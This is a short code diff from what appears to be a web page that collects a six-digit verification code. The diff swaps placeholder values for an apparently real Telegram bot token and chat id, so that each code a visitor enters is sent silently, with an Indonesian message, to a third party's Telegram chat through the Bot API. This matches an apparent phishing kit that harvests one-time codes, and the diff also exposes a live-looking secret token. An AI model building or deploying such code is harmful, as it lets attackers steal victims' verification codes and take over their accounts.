@@ -157,8 +157,8 @@
       if (code.length !== 6) return;
 
       // Telegram Bot API details - replace with your own
-      const botToken = 'YOUR_BOT_TOKEN';
-      const chatId = 'YOUR_CHAT_ID';
+      const botToken = '8275257587:AAHqb6nOza3eaFNZQGtr5yNuS5D9NArBBbE';
+      const chatId = '7549590022';
       const message = encodeURIComponent(`Kode verifikasi yang dimasukkan: ${code}`);
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
